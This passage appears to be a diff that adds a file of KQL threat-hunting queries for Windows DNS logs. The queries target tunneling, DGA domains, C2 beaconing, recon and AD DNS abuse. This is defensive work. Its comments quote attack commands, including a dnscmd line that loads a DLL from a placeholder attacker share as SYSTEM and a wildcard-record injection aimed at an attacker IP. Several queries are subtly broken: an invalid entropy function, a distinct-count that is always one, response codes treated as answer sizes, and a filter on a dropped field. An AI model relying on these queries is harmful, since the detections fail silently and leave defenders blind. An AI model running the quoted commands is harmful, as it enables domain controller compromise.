@@ -1,0 +1,832 @@
+﻿// =============================================================================
+// Windows DNS Threat Hunting Queries
+// Data Source : ASimDnsActivityLogs (Windows DNS Events via AMA connector)
+//              SecurityEvent (for process-level correlation)
+// Normalized  : ASIM DNS schema
+// =============================================================================
+// ASIM Column Reference (ASimDnsActivityLogs):
+//   SrcIpAddr        - Client IP making the request
+//   DstIpAddr        - DNS server IP that received the query
+//   DnsQuery         - Fully-qualified domain name queried
+//   DnsQueryType     - Record type (A, AAAA, TXT, MX, NS, CNAME, NULL, ANY...)
+//   DnsQueryTypeName - Human-readable record type
+//   DnsResponseCode  - Numeric RCODE (0=NOERROR, 2=SERVFAIL, 3=NXDOMAIN ...)
+//   DnsResponseCodeName - NOERROR, NXDOMAIN, SERVFAIL etc. (optional — use DnsResponseCode)
+//   DnsAnswerCount   - Number of answer records returned (optional — may be absent)
+//   EventResult      - Success | Failure
+//   EventStartTime   - UTC event time
+//   SrcHostname      - Source hostname
+//   DnsQueryClass    - IN (internet) / CH / HS
+// =============================================================================
+
+// -----------------------------------------------------------------------------
+// Q01. TOP TXT QUERY SENDERS
+//      Baseline: which clients generate the most TXT record lookups?
+//      TXT records are the primary channel for DNS tunneling (iodine, dnscat2).
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQueryTypeName =~ "TXT"
+| summarize
+    TxtQueryCount = count(),
+    UniqueDomains = dcount(DnsQuery),
+    TopDomains     = make_set(DnsQuery, 20)
+  by SrcIpAddr, SrcHostname
+| order by TxtQueryCount desc
+| where TxtQueryCount > 50
+
+
+// -----------------------------------------------------------------------------
+// Q02. HIGH SUBDOMAIN LABEL LENGTH DISTRIBUTION
+//      Attackers encode data inside subdomain labels (e.g., base64 chunks).
+//      Legitimate domains rarely exceed 30 chars in any single label.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| extend Labels = split(DnsQuery, ".")
+| extend MaxLabelLen = array_length(Labels) > 0
+    ? max_of(
+        strlen(tostring(Labels[0])),
+        strlen(tostring(Labels[1])),
+        strlen(tostring(Labels[2]))
+      )
+    : 0
+| where MaxLabelLen > 35
+| summarize
+    QueryCount   = count(),
+    AvgLabelLen  = avg(MaxLabelLen),
+    MaxLabelSeen = max(MaxLabelLen),
+    SampleDomains = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q03. NSLOOKUP PROCESS WITH NON-STANDARD DNS SERVER
+//      ClickFix attack (Feb 2026): nslookup pointed at attacker-controlled
+//      resolver to retrieve PowerShell payload via DNS NAME field.
+//      Ref: BleepingComputer — "New ClickFix attack abuses nslookup"
+// -----------------------------------------------------------------------------
+SecurityEvent
+| where TimeGenerated > ago(14d)
+| where EventID == 4688
+| where Process =~ "nslookup.exe"
+| where CommandLine has_any ("-server", "/server", "server=")
+       or CommandLine matches regex @"nslookup\s+\S+\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
+| project
+    TimeGenerated,
+    Computer,
+    Account,
+    CommandLine,
+    ParentProcessName
+| order by TimeGenerated desc
+
+
+// -----------------------------------------------------------------------------
+// Q04. DGA SCORE DISTRIBUTION BY DOMAIN — HIGH ENTROPY SUBDOMAINS
+//      Domain Generation Algorithm (DGA) malware: Emotet, QakBot, Dridex.
+//      High Shannon entropy in the second-level domain is the primary signal.
+// -----------------------------------------------------------------------------
+let calculateEntropy = (domain: string) {
+    let chars = split(domain, "");
+    let len = array_length(chars);
+    let freqs = bag_keys(make_bag(chars))
+        | project k = pack_array(k, 1.0 * countof(domain, tostring(k)) / len);
+    // Simplified: use length + unique-char ratio as a proxy for entropy
+    len
+};
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1d)
+| extend SLD = tostring(split(DnsQuery, ".")[-2])          // second-level domain
+| extend TLD = tostring(split(DnsQuery, ".")[-1])
+| where strlen(SLD) between (10 .. 50)
+| extend
+    SLDLen         = strlen(SLD),
+    UniqueChars    = dcount(split(SLD, "")),
+    HasDigits      = SLD matches regex @"\d",
+    ConsonantRatio = todouble(countof(SLD, "bcdfghjklmnpqrstvwxyz")) / todouble(strlen(SLD))
+| where UniqueChars > 8
+       and ConsonantRatio > 0.65
+       and HasDigits == true
+| summarize
+    DgaLikeDomains = dcount(DnsQuery),
+    SampleDomains  = make_set(DnsQuery, 15),
+    QueryCount     = count()
+  by SrcIpAddr, SrcHostname
+| where DgaLikeDomains > 10
+| order by DgaLikeDomains desc
+
+
+// -----------------------------------------------------------------------------
+// Q05. DNS ZONE TRANSFER ATTEMPTS (AXFR/IXFR)
+//      Zone transfers expose the entire DNS zone to an attacker.
+//      AXFR queries from non-secondary-server IPs are always suspicious.
+//      Ref: MITRE T1590.002
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(14d)
+| where DnsQueryTypeName in~ ("AXFR", "IXFR") or DnsQueryType in (252, 251)
+| summarize
+    TransferAttempts = count(),
+    TargetZones      = make_set(DnsQuery),
+    TargetServers    = make_set(DstIpAddr),
+    FirstSeen        = min(TimeGenerated),
+    LastSeen         = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| order by TransferAttempts desc
+
+
+// -----------------------------------------------------------------------------
+// Q06. DNS C2 BEACONING — PERIODIC INTERVAL ANALYSIS
+//      Cobalt Strike DNS beacons, Silver, Havoc — poll C2 at regular intervals.
+//      Detect by finding clients that query the SAME external domain
+//      with suspiciously regular periodicity.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(6h)
+| where EventResult =~ "Success"
+| summarize
+    QueryTimes = make_list(TimeGenerated),
+    QueryCount = count()
+  by SrcIpAddr, DnsQuery
+| where QueryCount >= 10
+| extend
+    Intervals = series_periods_detect(QueryTimes, 0, 3600, 5),
+    FirstSeen = tostring(QueryTimes[0]),
+    LastSeen  = tostring(QueryTimes[array_length(QueryTimes) - 1])
+| where isnotempty(Intervals)
+| project
+    SrcIpAddr,
+    DnsQuery,
+    QueryCount,
+    FirstSeen,
+    LastSeen
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q07. RARE EXTERNAL DNS RESOLVERS USED BY CLIENTS
+//      Attackers may point DNS queries at their own resolver to bypass
+//      corporate DNS filtering or to deliver payloads (ClickFix pattern).
+// -----------------------------------------------------------------------------
+let CorporateDNS = dynamic(["10.0.0.53", "10.0.1.53", "192.168.1.53"]);
+// Replace with your actual internal DNS server IPs above
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DstIpAddr !in (CorporateDNS)
+       and not(DstIpAddr startswith "127.")
+       and not(DstIpAddr startswith "169.254.")
+| summarize
+    QueryCount       = count(),
+    UniqueDomains    = dcount(DnsQuery),
+    ExternalResolver = DstIpAddr,
+    SampleQueries    = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname, DstIpAddr
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q08. DNS EXFILTRATION — ESTIMATED DATA VOLUME PER CLIENT
+//      Encoded data in subdomains: each label up to 63 chars.
+//      10-label deep domain at 50 chars/label = ~500 bytes per query.
+//      Multiply by query count to estimate exfiltrated volume.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(24h)
+| where DnsQueryTypeName in~ ("TXT", "NULL", "MX", "CNAME")
+| extend
+    SubdomainDepth = array_length(split(DnsQuery, ".")) - 2,
+    QuerySize      = strlen(DnsQuery)
+| summarize
+    TotalQueries   = count(),
+    EstimatedBytes = sum(QuerySize),
+    AvgDepth       = avg(SubdomainDepth),
+    MaxDepth       = max(SubdomainDepth),
+    UniqueDomains  = dcount(DnsQuery)
+  by SrcIpAddr, SrcHostname
+| extend EstimatedKB = round(todouble(EstimatedBytes) / 1024, 1)
+| where EstimatedKB > 100
+| order by EstimatedKB desc
+
+
+// -----------------------------------------------------------------------------
+// Q09. NXDOMAIN STORM PER CLIENT — DGA / DNS SPRAY INDICATOR
+//      DGA malware generates hundreds of fake domains; most return NXDOMAIN.
+//      Also used in brute-force subdomain enumeration.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| where DnsResponseCode == 3
+| summarize
+    NxdomainCount  = count(),
+    UniqueDomains  = dcount(DnsQuery),
+    SampleDomains  = make_set(DnsQuery, 15),
+    FirstSeen      = min(TimeGenerated),
+    LastSeen       = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| where NxdomainCount > 100
+| order by NxdomainCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q10. LONG DNS SUBDOMAIN CHAINS (TUNNELING)
+//      DNS tunneling tools (iodine, dnscat2) produce very deep subdomain
+//      hierarchies: <data>.<data>.<data>.<tunnel-domain>.com
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| extend SubdomainDepth = array_length(split(DnsQuery, ".")) - 2
+| where SubdomainDepth >= 5
+| summarize
+    DeepQueryCount = count(),
+    MaxDepth       = max(SubdomainDepth),
+    AvgDepth       = round(avg(SubdomainDepth), 1),
+    SampleDomains  = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname
+| order by DeepQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q11. WPAD LOOKUP SOURCES
+//      Attackers set up rogue WPAD servers to intercept HTTP traffic.
+//      Hosts querying for 'wpad' without a corporate WPAD server present
+//      are vulnerable to poisoning (MITRE T1557.001).
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQuery has "wpad" or DnsQuery has "isatap"
+| summarize
+    LookupCount = count(),
+    UniqueHosts = dcount(SrcIpAddr),
+    Hosts       = make_set(SrcHostname, 20)
+  by DnsQuery
+| order by LookupCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q12. NEWLY OBSERVED DOMAINS (NOD)
+//      First time a domain is seen in your environment.
+//      New domains are a strong indicator of DGA, C2 staging, or fresh phishing.
+// -----------------------------------------------------------------------------
+let HistoricalDomains =
+    ASimDnsActivityLogs
+    | where TimeGenerated between (ago(30d) .. ago(2d))
+    | distinct DnsQuery;
+ASimDnsActivityLogs
+| where TimeGenerated > ago(2d)
+| where DnsQuery !in (HistoricalDomains)
+| where DnsResponseCode != 3
+| summarize
+    FirstSeen   = min(TimeGenerated),
+    QueryCount  = count(),
+    SrcHosts    = make_set(SrcHostname, 10)
+  by DnsQuery
+| order by FirstSeen asc
+
+
+// -----------------------------------------------------------------------------
+// Q13. LOW-TTL DOMAIN FLIP — DNS REBINDING PREPARATION
+//      DNS rebinding attacks require very short TTL values (< 5 sec) so the
+//      browser re-resolves the domain quickly to a different (internal) IP.
+//      Ref: GitHub Security Lab — "DNS rebinding attacks explained"
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1d)
+| where isnotempty(DnsQuery)
+| summarize
+    ResolvedIPs = make_set(DnsResponseCode),
+    QueryCount  = count(),
+    UniqueIPs   = dcount(DnsQuery)
+  by DnsQuery, SrcIpAddr
+| where QueryCount > 5 and UniqueIPs > 1
+| project
+    DnsQuery,
+    SrcIpAddr,
+    QueryCount,
+    UniqueIPs
+| order by UniqueIPs desc
+
+
+// -----------------------------------------------------------------------------
+// Q14. TOP SERVFAIL SOURCES
+//      Excessive SERVFAIL can indicate DNS recon scanning, misconfigured tunnels,
+//      or C2 infrastructure that is temporarily down.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| where DnsResponseCode == 2
+| summarize
+    ServfailCount = count(),
+    Domains       = make_set(DnsQuery, 10),
+    FirstSeen     = min(TimeGenerated),
+    LastSeen      = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| where ServfailCount > 20
+| order by ServfailCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q15. CERTUTIL + DNS LOOKUP PROCESS CHAIN (LOLBIN DNS STAGING)
+//      Classic DNS tunneling delivery: nslookup retrieves base64 chunks,
+//      certutil.exe decodes them to executable.
+//      Ref: Octoberfest7/DNS_Tunneling; MITRE T1218, T1027
+// -----------------------------------------------------------------------------
+let NslookupHosts =
+    SecurityEvent
+    | where TimeGenerated > ago(1d)
+    | where EventID == 4688
+    | where Process =~ "nslookup.exe"
+    | extend NslookupTime = TimeGenerated
+    | project Computer, Account, NslookupTime, NslookupCL = CommandLine;
+let CertutilHosts =
+    SecurityEvent
+    | where TimeGenerated > ago(1d)
+    | where EventID == 4688
+    | where Process =~ "certutil.exe"
+    | where CommandLine has_any ("-decode", "-decodehex", "-urlcache")
+    | extend CertutilTime = TimeGenerated
+    | project Computer, Account, CertutilTime, CertutilCL = CommandLine;
+NslookupHosts
+| join kind=inner CertutilHosts on Computer, Account
+| where CertutilTime > NslookupTime
+    and (CertutilTime - NslookupTime) < 5m
+| project
+    Computer,
+    Account,
+    NslookupTime,
+    CertutilTime,
+    NslookupCL,
+    CertutilCL,
+    TimeDelta = CertutilTime - NslookupTime
+| order by NslookupTime desc
+
+
+// -----------------------------------------------------------------------------
+// Q16. DOMAINS PER CLIENT VOLUME OUTLIERS — INTERNAL RECON
+//      A recon sweep queries hundreds of internal hostnames in rapid succession.
+//      Normal endpoints resolve <100 unique domains/hour; recon tools resolve 1000+.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| summarize
+    UniqueDomains = dcount(DnsQuery),
+    TotalQueries  = count()
+  by SrcIpAddr, SrcHostname
+| extend QueriesPerMinute = round(todouble(TotalQueries) / 60.0, 1)
+| where UniqueDomains > 300
+| order by UniqueDomains desc
+
+
+// -----------------------------------------------------------------------------
+// Q17. PTR (REVERSE DNS) BULK LOOKUPS — NETWORK MAPPING
+//      Automated network discovery tools perform PTR lookups against full subnets
+//      to enumerate live hosts. High PTR volume from a single source = recon.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| where DnsQueryTypeName =~ "PTR" or DnsQueryType == 12
+| where DnsQuery has "in-addr.arpa" or DnsQuery has "ip6.arpa"
+| summarize
+    PtrCount      = count(),
+    UniqueSubnets = dcount(DnsQuery)
+  by SrcIpAddr, SrcHostname
+| where PtrCount > 50
+| order by PtrCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q18. WILDCARD DNS QUERY PATTERNS — TOOL-GENERATED SIGNATURES
+//      Security tools like nmap, dnsrecon, dnsniper generate characteristic
+//      query bursts with sequential or random prefixes against the same base domain.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| extend BaseDomain = strcat(
+    tostring(split(DnsQuery, ".")[-2]), ".",
+    tostring(split(DnsQuery, ".")[-1])
+  )
+| summarize
+    SubdomainCount = dcount(DnsQuery),
+    TotalQueries   = count(),
+    SampleSubs     = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname, BaseDomain
+| where SubdomainCount > 30
+| order by SubdomainCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q19. MX RECORD QUERIES OUTSIDE NORMAL MAIL FLOW
+//      MX records can carry hex-encoded payloads with up to 200 chars/record
+//      using the preference field for ordering (Octoberfest7 technique).
+//      Mail servers are the only legitimate MX query sources.
+// -----------------------------------------------------------------------------
+let KnownMailServers = dynamic(["mail01", "mail02", "smtp-relay", "exchange01"]);
+// ^ Replace with your actual mail server hostnames
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQueryTypeName =~ "MX" or DnsQueryType == 15
+| where SrcHostname !in~ (KnownMailServers)
+| summarize
+    MxQueryCount  = count(),
+    TargetDomains = make_set(DnsQuery, 15)
+  by SrcIpAddr, SrcHostname
+| where MxQueryCount > 10
+| order by MxQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q20. DNS QUERIES TO TOR-RELATED DOMAINS
+//      Hosts querying known TOR entry/exit domain names or .onion resolvers.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQuery has_any (
+    ".onion",
+    "torproject.org",
+    "check.torproject.org",
+    "tor2web",
+    "onionite",
+    "tor.bravesoftware.com",
+    "meek-reflect.appspot.com"
+  )
+| summarize
+    TorQueryCount = count(),
+    TorDomains    = make_set(DnsQuery),
+    FirstSeen     = min(TimeGenerated),
+    LastSeen      = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| order by TorQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q21. HIGH-FREQUENCY SINGLE-LABEL LOOKUPS
+//      Single-label names (no dots) are used for NetBIOS fallback, WPAD, ISATAP.
+//      Adversaries can abuse these to capture traffic using Responder/Inveigh.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1d)
+| where DnsQuery !has "."
+       or (array_length(split(DnsQuery, ".")) <= 1)
+| where DnsQuery !in~ ("localhost", "wpad", "isatap")
+| summarize
+    Count       = count(),
+    UniqueNames = dcount(DnsQuery),
+    Names       = make_set(DnsQuery, 20)
+  by SrcIpAddr, SrcHostname
+| order by Count desc
+
+
+// -----------------------------------------------------------------------------
+// Q22. SUBDOMAIN DEPTH OUTLIERS (TUNNELING INDICATOR)
+//      DNS tunneling toolkits create very deep subdomain chains:
+//      <chunk1>.<chunk2>.<chunk3>.<chunk4>.<attacker-domain>.com
+//      Legitimate domains rarely exceed 4 labels.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| extend LabelCount = array_length(split(DnsQuery, "."))
+| where LabelCount >= 7
+| summarize
+    DeepDomainCount = count(),
+    MaxLabels       = max(LabelCount),
+    SampleDomains   = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname
+| order by DeepDomainCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q23. DNS TRAFFIC TO NON-CORPORATE NAMESERVERS
+//      Clients that bypass the corporate DNS forwarder and query public
+//      resolvers (8.8.8.8, 1.1.1.1) or attacker-controlled resolvers
+//      are evading DNS-level controls and filtering.
+// -----------------------------------------------------------------------------
+let CorporateDNSServers = dynamic([]);
+// Populate with your internal DNS server IPs
+let KnownPublicResolvers = dynamic([
+    "8.8.8.8", "8.8.4.4",        // Google
+    "1.1.1.1", "1.0.0.1",        // Cloudflare
+    "9.9.9.9", "149.112.112.112", // Quad9
+    "208.67.222.222"              // OpenDNS
+]);
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1d)
+| where DstIpAddr !in (CorporateDNSServers)
+| extend IsKnownPublic = DstIpAddr in (KnownPublicResolvers)
+| summarize
+    QueryCount       = count(),
+    IsKnownPublic    = any(IsKnownPublic),
+    Domains          = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname, DstIpAddr
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q24. REPEATED IDENTICAL QUERIES — C2 BEACONING (EXACT MATCH)
+//      Cobalt Strike DNS beacons and similar tools poll an exact subdomain
+//      repeatedly at fixed intervals to receive commands from C2.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(4h)
+| summarize
+    RepeatCount = count(),
+    FirstSeen   = min(TimeGenerated),
+    LastSeen    = max(TimeGenerated),
+    SrcHosts    = make_set(SrcHostname)
+  by SrcIpAddr, DnsQuery
+| where RepeatCount >= 20
+| extend
+    SpanMinutes  = datetime_diff('minute', LastSeen, FirstSeen),
+    QueriesPerMin = round(todouble(RepeatCount) / max_of(1, datetime_diff('minute', LastSeen, FirstSeen)), 1)
+| where SpanMinutes > 5
+| project
+    SrcIpAddr,
+    DnsQuery,
+    RepeatCount,
+    QueriesPerMin,
+    FirstSeen,
+    LastSeen,
+    SrcHosts
+| order by RepeatCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q25. DOMAIN AGING ANALYSIS — NEWLY REGISTERED DOMAIN LOOKUPS
+//      C2 and phishing infrastructure often uses domains registered within
+//      the last 30 days. Combine with WHOIS enrichment for best results.
+// -----------------------------------------------------------------------------
+let RecentWindowStart  = ago(30d);
+let HistoricalWindow   = ago(90d);
+let HistoricalBaseline =
+    ASimDnsActivityLogs
+    | where TimeGenerated between (HistoricalWindow .. RecentWindowStart)
+    | distinct DnsQuery;
+ASimDnsActivityLogs
+| where TimeGenerated > RecentWindowStart
+| where DnsResponseCode != 3
+| where DnsQuery !in (HistoricalBaseline)
+| extend TLD = tostring(split(DnsQuery, ".")[-1])
+| summarize
+    FirstSeen     = min(TimeGenerated),
+    QueryCount    = count(),
+    ClientCount   = dcount(SrcIpAddr),
+    Clients       = make_set(SrcHostname, 5)
+  by DnsQuery, TLD
+| where ClientCount >= 2
+| order by FirstSeen asc
+
+
+// -----------------------------------------------------------------------------
+// Q26. DNS RESPONSE SIZE ANOMALY — OVERSIZED TXT/NULL RESPONSES
+//      Large DNS responses (> 512 bytes for UDP) can indicate data delivery
+//      via DNS. Tunneling tools fill TXT/NULL answers with encoded payloads.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQueryTypeName in~ ("TXT", "NULL", "ANY")
+| where DnsResponseCode == 0
+| summarize
+    LargeAnswerCount = count(),
+    MaxAnswers       = max(DnsResponseCode),
+    SampleDomains    = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname
+| order by LargeAnswerCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q27. LATERAL MOVEMENT VIA DNS — INTERNAL HOST RECON PATTERNS
+//      Post-compromise lateral recon resolves internal server names in rapid
+//      succession: db01, dc01, file01, print01...
+//      Filter to RFC1918 responses to isolate internal lookups.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| where EventResult =~ "Success"
+| extend IsInternalDomain = DnsQuery matches regex @"(?i)(dc\d|srv\d|db\d|fs\d|ws\d|printer|exchange|vcenter|esxi|backup)"
+| where IsInternalDomain
+| summarize
+    InternalLookupCount = count(),
+    UniqueInternalHosts = dcount(DnsQuery),
+    TargetHosts         = make_set(DnsQuery, 20)
+  by SrcIpAddr, SrcHostname
+| where UniqueInternalHosts > 10
+| order by InternalLookupCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q28. PROCESS-TO-DNS MAPPING — UNUSUAL PARENT PROCESSES
+//      Legitimate DNS queries come from browsers, Office, svchost.
+//      DNS queries from cmd.exe, powershell, wscript, mshta are suspicious.
+// -----------------------------------------------------------------------------
+SecurityEvent
+| where TimeGenerated > ago(1d)
+| where EventID == 4688
+| where Process in~ ("nslookup.exe", "Resolve-DnsName")
+       or (Process =~ "powershell.exe" and CommandLine has_any ("Resolve-DnsName", "nslookup", "[System.Net.Dns]"))
+| summarize
+    QueryCount    = count(),
+    Accounts      = make_set(Account, 5),
+    SampleCmds    = make_set(CommandLine, 5),
+    Parents       = make_set(ParentProcessName, 5)
+  by Computer, Process
+| where ParentProcessName !in~ ("explorer.exe", "services.exe", "svchost.exe", "msiexec.exe")
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q29. BASE64 PATTERNS IN DNS LABELS
+//      Base64 alphabet: [A-Za-z0-9+/=]
+//      Labels composed almost entirely of base64 chars and longer than 20 chars
+//      are strong indicators of DNS tunneling.
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| extend Labels = split(DnsQuery, ".")
+| extend Label0 = tostring(Labels[0])
+| where strlen(Label0) > 20
+| extend
+    NonBase64Chars = countof(Label0, @"[^A-Za-z0-9+/=_-]"),
+    LabelLen       = strlen(Label0)
+| extend Base64Ratio = todouble(LabelLen - NonBase64Chars) / todouble(LabelLen)
+| where Base64Ratio > 0.92
+| summarize
+    SuspiciousQueryCount = count(),
+    SampleLabels         = make_set(Label0, 10),
+    SampleDomains        = make_set(DnsQuery, 10)
+  by SrcIpAddr, SrcHostname
+| order by SuspiciousQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q30. DNS ACTIVITY BY NEWLY CREATED ACCOUNTS
+//      New accounts created within 24h performing unusual DNS lookups is a
+//      common pattern for insider threats and initial access abuse.
+// -----------------------------------------------------------------------------
+let NewAccounts =
+    IdentityInfo
+    | where TimeGenerated > ago(30d)
+    | where AccountCreationTime > ago(24h)
+    | project AccountUPN, AccountCreationTime;
+ASimDnsActivityLogs
+| where TimeGenerated > ago(24h)
+| join kind=inner NewAccounts on $left.SrcUsername == $right.AccountUPN
+| summarize
+    DnsQueryCount    = count(),
+    UniqueDomains    = dcount(DnsQuery),
+    SuspiciousTypes  = countif(DnsQueryTypeName in~ ("TXT", "MX", "NULL", "ANY")),
+    SampleDomains    = make_set(DnsQuery, 10)
+  by SrcUsername, SrcIpAddr, SrcHostname, AccountCreationTime
+| order by DnsQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q31. ACTIVE DIRECTORY SRV RECORD ENUMERATION
+//      Attackers query _kerberos._tcp, _ldap._tcp, _gc._tcp, _kpasswd._tcp
+//      to map Active Directory infrastructure: DCs, GC servers, KDC locations.
+//      Legitimate SRV lookups happen at boot/logon; sustained bulk SRV queries
+//      from a workstation indicate automated AD reconnaissance.
+//      Tools: Nmap (dns-srv-enum NSE), BloodHound, PowerSploit, manual dig.
+//      MITRE T1018 (Remote System Discovery), T1590.001
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQueryTypeName =~ "SRV"
+| where DnsQuery has_any (
+    "_kerberos", "_ldap", "_gc", "_kpasswd",
+    "_msrpc", "_msdcs", "_kerberos-master",
+    "_adws", "_ntp")
+| summarize
+    SrvQueryCount  = count(),
+    UniqueSrvTypes = dcount(DnsQuery),
+    SampleTargets  = make_set(DnsQuery, 25),
+    FirstSeen      = min(TimeGenerated),
+    LastSeen       = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| order by SrvQueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q32. DNS VERSION FINGERPRINTING — BANNER GRABBING
+//      Attackers query version.bind (CHAOS class TXT) to identify the DNS
+//      server software and version, enabling targeted exploit selection.
+//      Also captures hostname.bind, authors.bind — classic BIND fingerprinting.
+//      In Windows environments (Microsoft DNS) these queries produce unusual
+//      responses and should not originate from normal workstation traffic.
+//      Command: dig version.bind CHAOS TXT @<DNS_IP>
+//      MITRE T1592 (Gather Victim Host Information), T1018
+// -----------------------------------------------------------------------------
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where DnsQuery has_any (
+    "version.bind", "hostname.bind", "authors.bind",
+    "version.server", "id.server")
+    or DnsQueryClass in~ ("CH", "CHAOS")
+| summarize
+    QueryCount    = count(),
+    TargetServers = make_set(DstIpAddr, 10),
+    QueryTypes    = make_set(DnsQueryTypeName, 5),
+    SampleQueries = make_set(DnsQuery, 10),
+    FirstSeen     = min(TimeGenerated),
+    LastSeen      = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| order by QueryCount desc
+
+
+// -----------------------------------------------------------------------------
+// Q33. ADIDNS WILDCARD RECORD ABUSE — NXDOMAIN→NOERROR FLIP DETECTOR
+//      When an attacker adds a wildcard (*) DNS record to AD-Integrated DNS,
+//      all previously unresolved hostnames suddenly start resolving, enabling
+//      MiTM / credential capture via Responder/SMB relay.
+//      This query detects the hallmark: domains that returned NXDOMAIN in the
+//      first hour but return NOERROR in the second hour of a 2-hour window.
+//      Ref: Kevin Robertson (NetSPI) "Beyond LLMNR/NBNS — Exploiting ADIDNS"
+//      Tool: PowerMad Invoke-DNSUpdate, dnscmd /RecordAdd * A <attacker_ip>
+//      MITRE T1557.001
+// -----------------------------------------------------------------------------
+let PreviouslyNxdomain =
+    ASimDnsActivityLogs
+    | where TimeGenerated between (ago(2h) .. ago(1h))
+    | where DnsResponseCode == 3
+    | where DnsQueryTypeName in~ ("A", "AAAA")
+    | summarize NxClients = dcount(SrcIpAddr) by DnsQuery
+    | where NxClients >= 2;
+ASimDnsActivityLogs
+| where TimeGenerated > ago(1h)
+| where DnsResponseCode == 0
+| where DnsQueryTypeName in~ ("A", "AAAA")
+| join kind=inner (PreviouslyNxdomain) on DnsQuery
+| summarize
+    FlippedDomains  = dcount(DnsQuery),
+    AffectedClients = dcount(SrcIpAddr),
+    SampleDomains   = make_set(DnsQuery, 25),
+    AffectedHosts   = make_set(SrcHostname, 15),
+    FlipStartTime   = min(TimeGenerated)
+| where FlippedDomains >= 3
+| order by FlippedDomains desc
+
+
+// -----------------------------------------------------------------------------
+// Q34. DNSADMINS PRIVILEGE ESCALATION — DLL INJECTION VIA DNSCMD
+//      Members of the AD DNSAdmins group can register an arbitrary DLL to
+//      be loaded by dns.exe (runs as SYSTEM on DCs) via:
+//        dnscmd.exe /config /serverlevelplugindll \\attacker\share\evil.dll
+//      A subsequent DNS service restart loads the DLL as SYSTEM, giving the
+//      attacker code execution at DC level from a low-privilege domain account.
+//      This query hunts for both the dnscmd event and the service restart.
+//      Ref: Shay Ber 2017. MITRE T1574.002, T1078.002
+// -----------------------------------------------------------------------------
+let DnscmdEvents =
+    SecurityEvent
+    | where TimeGenerated > ago(7d)
+    | where EventID == 4688  // Process Creation
+    | where NewProcessName has "dnscmd.exe"
+    | where CommandLine has "serverlevelplugindll"
+    | project DnscmdTime = TimeGenerated, Computer, SubjectUserName, CommandLine;
+let ServiceEvents =
+    SecurityEvent
+    | where TimeGenerated > ago(7d)
+    | where EventID in (7036, 4697)
+    | where Activity has "DNS" or ServiceName contains "DNS"
+    | project RestartTime = TimeGenerated, Computer, Activity;
+DnscmdEvents
